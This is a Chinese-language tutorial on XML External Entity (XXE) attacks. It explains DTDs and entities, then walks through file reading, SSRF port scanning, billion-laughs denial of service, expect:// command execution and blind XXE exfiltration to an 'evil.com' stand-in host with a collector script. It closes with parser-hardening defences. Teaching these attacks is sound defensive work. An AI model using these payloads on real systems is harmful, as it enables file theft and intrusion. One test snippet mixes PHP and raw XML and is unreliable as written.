# XXE漏洞(XML External Entity attack)

标签（空格分隔）： Web安全

---

一、XML基础知识
=========

XML文档结构包括XML声明、DTD文档类型定义、文档元素。我们需要掌握的重点就是DTD--文档类型定义。
我们通过例子来了解一下DTD：

1、内部的 DOCTYPE 声明
----------------
语法

    <!DOCTYPE root-element [element-declarations]> 

实例

    <?xml version="1.0"?>
    <!DOCTYPE note [
    <!ELEMENT note (to,from,heading,body)>
    <!ELEMENT to (#PCDATA)>
    <!ELEMENT from (#PCDATA)>
    <!ELEMENT heading (#PCDATA)>
    <!ELEMENT body (#PCDATA)>
    ]>
    <note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>Reminder</heading>
    <body>Don't forget me this weekend</body>
    </note> 
以上 DTD 解释如下：

    !DOCTYPE note (第二行)定义此文档是 note 类型的文档。
    !ELEMENT note (第三行)定义 note 元素有四个元素："to、from、heading,、body"
    !ELEMENT to (第四行)定义 to 元素为 "#PCDATA" 类型
    !ELEMENT from (第五行)定义 from 元素为 "#PCDATA" 类型
    !ELEMENT heading (第六行)定义 heading 元素为 "#PCDATA" 类型
    !ELEMENT body (第七行)定义 body 元素为 "#PCDATA" 类型

2、外部的 DOCTYPE 声明
----------------
语法

    <!DOCTYPE root-element SYSTEM "filename">

实例

    <?xml version="1.0"?>
    <!DOCTYPE note SYSTEM "note.dtd">
    <note>
      <to>Tove</to>
      <from>Jani</from>
      <heading>Reminder</heading>
      <body>Don't forget me this weekend!</body>
    </note> 

这是包含 DTD 的 "note.dtd" 文件：

    <!ELEMENT note (to,from,heading,body)>
    <!ELEMENT to (#PCDATA)>
    <!ELEMENT from (#PCDATA)>
    <!ELEMENT heading (#PCDATA)>
    <!ELEMENT body (#PCDATA)> 

以上就是DTD的两种声明方式，接下来介绍一下什么是实体：
**实体是用于定义引用普通文本或特殊字符的快捷方式的变量。**
接下来还是用实例说明：

3、内部实体声明
--------

语法
   

     <!ENTITY entity-name "entity-value"> 
实例：

    DTD 实例:
    
    <!ENTITY writer "Donald Duck.">
    <!ENTITY copyright "Copyright runoob.com">
    
    XML 实例：
    
    <author>&writer;&copyright;</author>

4、外部实体声明
--------

语法

    <!ENTITY entity-name SYSTEM "URI/URL"> 

实例


    DTD 实例:
    
    <!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd">
    <!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd">
    
    XML example:
    
    <author>&writer;&copyright;</author> 
 
    

二、XXE攻击概述
=========

XML外部实体（XXE）攻击是许多基于注入的攻击方式之一，当攻击者将声明XML消息中的外部实体发送到应用程序并使用XML解析器解析时，就会发生这种攻击。下面是一些被xxe坑过的厂商和应用。
![此处输入图片的描述][1]


 接下来我们看看XXE可以怎样利用：
 

三、文件读取
======

![此处输入图片的描述][2]

这可以说是一种教科书式的xxe攻击，通过外部实体引用，可以获取远程文件内容。但是有个问题，如果文件内容格式太过复杂，就会导致 xml 解析失败(比如内容里含有 空格、一些特殊字符 < > & ; 之类的文件)

 


 在本地使用这段代码进行测试：

     <?php 
    header("Content-type: text/html; charset=utf-8"); 
    echo "<h3>xxe漏洞测试！</h3>";  
    $xml = '<?xml version="1.0" encoding="utf-8"?> 
    <!DOCTYPE xdsec   
    [ <!ELEMENT methodname ANY > <!ENTITY xxe SYSTEM "file:///D:/QQWhatsnew.txt" >]>   
    <root> <name>&xxe;</name> </root>';  
    try{   
    $doc = simplexml_load_string($xml); echo $doc->name;  
    }   
    catch(Exception $e){   
    print "error";   
    }  
    ?>  
效果如下：
![此处输入图片的描述][3]

在文件中加入<，报错：
![此处输入图片的描述][4]

这个其实有绕过方法的，可以利用***参数实体***，具体的内容后面介绍

还有一个我们知道的方法，就是使用 php 伪协议，php://filter 读取文件内容（ 文件内容经过 base64 过滤器，就是全字符的，没有格式干扰）
例如上面的代码可修改为：

    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=D:/QQWhatsnew.txt" >

四、URL 请求(ssrf)
==============
这里举一个端口扫描的例子：

    <?php 
    header("Content-type: text/html; charset=utf-8"); 
    echo "<h3>xxe漏洞测试！</h3>";  
    $xml = '<?xml version="1.0" encoding="utf-8"?> 
    <!DOCTYPE UserInfo[<!ENTITY name SYSTEM "http://127.0.0.1:135/">]>
    <UserInfo>
    <name>&name;</name>
    </UserInfo>';  
    try{   
    $doc = simplexml_load_string($xml); echo $doc->name;  
    }   
    catch(Exception $e){   
    print "error";   
    }  
    ?>  

还是在本地进行测试，在攻击者发送url请求时会有三种可能发生的情况：
1、![此处输入图片的描述][5]
可以看到报错中无其他信息，此时端口未开启。
2、正常回显
![此处输入图片的描述][6]
此时端口开启。
3、![此处输入图片的描述][7]
![此处输入图片的描述][8]
此时端口开启。

五、拒绝服务
======
![此处输入图片的描述][9]

任何能大量占用服务器资源的方法都可以造成 DoS，这个的原理就是递归引用

lol 实体具体还有 "lol" 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 "lol" 了，以此类推，lol9 实体含有 10^8 个 "lol" 字符串…

那么，引用 lol9，boom…
经虚拟机测试，直接占满cpu，只能重启。
当然还有很多方法。。。

六、系统命令执行
========

PHP的Expect扩展：pecl install expect

    <!DOCTYPE root 
    [<!ENTITY foo SYSTEM "expect://id">]>
    <methodCall>
    <methodName>&foo;</methodName>
    </methodCall>

上面是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。

七、参数实体
======

    <!ENTITY % start "<![CDATA[">
    <!ENTITY % goodies SYSTEM "file:///etc/fstab">
    <!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "http://evil.example.com/combine.dtd">
    <!ENTITY all "%start;%goodies;%end;">
    
其实流程很简单：

    start 参数实体的内容： <! [CDATA[
    
    goodies 参数实体的内容： file:///etc/fastab （使用 file 协议读取文件）
    
    end 参数实体的内容：]]>
    
    然后接着定义了一个 dtd 参数实体，使用 SYSTEM 发出获取 combine.dtd 的内容

最后，再由源文件中引用 all 普通实体引发文件读取：

    <roottag><! [CDATA["/etc/fstab文件的内容"]]></roottag>
    
其中这个 CDATA 的意思是为 文件内容添加属性：不被解析的普通字符

这样，参数实体的引用就不需要在xml文档解析的时候保持xml闭合,xml 解释器就会直接忽略文件内容的语法规则，达到了绕过的目的

八、Blind XXE
===========

有了参数实体的基础之后，我们就可以进行Blind XXE攻击了。

对于传统的XXE来说，要求有一点，就是攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件。如果服务器没有回显，通常有两种情况：服务器禁止了外部实体引用；服务器进行了过滤或者展示限制。如果是第二种，就可能出现Blind XXE。简单来说Blind XXE可以构建一条带外信道提取数据。带外数据通道的建立是使用嵌套形式，利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系。将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。

测试如下：

    <?php
    <?xml version="1.0"?>
    <!DOCTYPE ANY[
    <!ENTITY % file SYSTEM "file:///C:/passwd.txt">
    <!ENTITY % remote SYSTEM "http://evil.com/evil.xml">
    %remote;
    %all;
    	%send;
    ]>
    $data = simplexml_load_string($xml) ;
    echo "<pre>" ;
    print_r($data) ;
    ?>

上面是存在漏洞的页面test.php 。

evil.xml 的内容为：

    <!ENTITY % all "<!ENTITY % send SYSTEM 'http://evil/1.php?file=%file;'>"> 

1.php的内容为：
 

       <?php  
        file_put_contents("1.txt", $_GET['file']) ;  
        ?>  

访问test.php, 也就是模拟攻击者构造XXE请求，然后存在漏洞的服务器会读出file的内容（c:/1.txt），通过带外通道发送给攻击者服务器上的1.php，1.php做的事情就是把读取的数据保存到本地的1.txt中，完成Blind XXE攻击。

九、防御
====
1 直接使用开发语言提供的禁用外部实体的方法



PHP：

    libxml_disable_entity_loader(true);

JAVA:

    DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
    dbf.setExpandEntityReferences(false);

Python：

    from lxml import etree
    xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))

2 过滤用户提交的 xml 数据

敏感关键词： `<!DOCTYPE 、 <!ENTITY、SYSTEM、PUBLIC`
  [1]: https://raw.githubusercontent.com/StarryPath/xxe-png/master/QQ%E6%88%AA%E5%9B%BE20180210135808.png
  [2]: https://raw.githubusercontent.com/StarryPath/xxe-png/master/QQ%E6%88%AA%E5%9B%BE20180210135910.png
  [3]: https://raw.githubusercontent.com/StarryPath/xxe-png/master/QQ%E6%88%AA%E5%9B%BE20180210154732.png
  [4]: https://raw.githubusercontent.com/StarryPath/xxe-png/master/QQ%E6%88%AA%E5%9B%BE20180210154933.png
  [5]: https://raw.githubusercontent.com/StarryPath/xxe-png/master/QQ%E6%88%AA%E5%9B%BE20180211131939.png
  [6]: https://raw.githubusercontent.com/StarryPath/xxe-png/master/QQ%E6%88%AA%E5%9B%BE20180211132137.png
  [7]: https://raw.githubusercontent.com/StarryPath/xxe-png/master/QQ%E6%88%AA%E5%9B%BE20180211133129.png
  [8]: https://raw.githubusercontent.com/StarryPath/xxe-png/master/QQ%E6%88%AA%E5%9B%BE20180211133154.png
  [9]: https://raw.githubusercontent.com/StarryPath/xxe-png/master/QQ%E6%88%AA%E5%9B%BE20180211133946.png
